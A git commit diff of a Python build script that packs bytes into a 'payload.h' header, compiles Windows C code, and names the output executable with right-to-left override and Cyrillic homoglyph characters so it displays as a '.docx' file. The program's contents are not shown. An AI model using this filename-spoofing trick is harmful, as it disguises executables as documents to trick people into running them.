d17acdc5c68ebcb6d040ce2e0cf9f4b80d703755
Krzem <krzem5.dev@gmail.com>
2021-03-27 17:05:59 +0100

    Push Update 03/27/2021, 17:05:47

--- build.py
+++ build.py
@@ -19,8 +19,10 @@ with open("payload.h","w") as f:
 		f.write(f"\t{', '.join(['0x'+hex(e)[2:].rjust(2,'0') for e in dt[i:i+6]])}{(',' if i+6<len(dt) else '')}\n")
 		i+=6
 	f.write(f"}};\n\n\n\nstatic const uint32_t PAYLOAD_SIZE={len(dt)};\n\n\n\n#endif\n")
-if (subprocess.run(["cl","/c","/permissive-","/GS","/W3","/Zc:wchar_t","/Gm-","/sdl","/Zc:inline","/fp:precise","/D","NDEBUG","/D","_WINDOWS","/D","_UNICODE","/D","UNICODE","/errorReport:none","/WX","/Zc:forScope","/Gd","/Oi","/FC","/EHsc","/nologo","/diagnostics:column","/GL","/Gy","/Zi","/O2","/Oi","/MD","../src/*.c"]).returncode==0 and subprocess.run(["rc","/r","/fo","resource.res","/nologo","../resource.rc"]).returncode==0 and subprocess.run(["link","*.obj","*.res","/OUT:what_is_an_\u202ex\u0441od\u202e.exe","/DYNAMICBASE","user32.lib","shell32.lib","shlwapi.lib","/MACHINE:X64","/SUBSYSTEM:WINDOWS","/ERRORREPORT:none","/NOLOGO","/TLBID:1","/WX","/LTCG","/OPT:REF","/INCREMENTAL:NO","/OPT:ICF","/LARGEADDRESSAWARE"]).returncode==0):
+if (subprocess.run(["cl","/c","/permissive-","/utf-8","/GS","/W3","/Zc:wchar_t","/Gm-","/sdl","/Zc:inline","/fp:precise","/D","NDEBUG","/D","_WINDOWS","/D","_UNICODE","/D","UNICODE","/errorReport:none","/WX","/Zc:forScope","/Gd","/Oi","/FC","/EHsc","/nologo","/diagnostics:column","/GL","/Gy","/Zi","/O2","/Oi","/MD","../src/*.c"]).returncode==0 and subprocess.run(["rc","/r","/fo","resource.res","/nologo","../resource.rc"]).returncode==0 and subprocess.run(["link","*.obj","*.res","/OUT:what_is_an_\u202ex\u0441od\u202e.exe","/DYNAMICBASE","user32.lib","shell32.lib","shlwapi.lib","/MACHINE:X64","/SUBSYSTEM:WINDOWS","/ERRORREPORT:none","/NOLOGO","/TLBID:1","/WX","/LTCG","/OPT:REF","/INCREMENTAL:NO","/OPT:ICF","/LARGEADDRESSAWARE"]).returncode==0):
 	os.system("del *.obj&&del *.pdb&&del *.h&&del *.res&&cls")
-	subprocess.run(["what_is_an_\u202ex\u0441od\u202e.exe"])
+	with open("_what_is_an_\u202ex\u0441od\u202e.exe","wb") as wf,open("what_is_an_\u202ex\u0441od\u202e.exe","rb") as rf:
+		wf.write(rf.read())
+	subprocess.run(["_what_is_an_\u202ex\u0441od\u202e.exe"])
 os.chdir(b_fp)
 os.environ["INCLUDE"]=ti
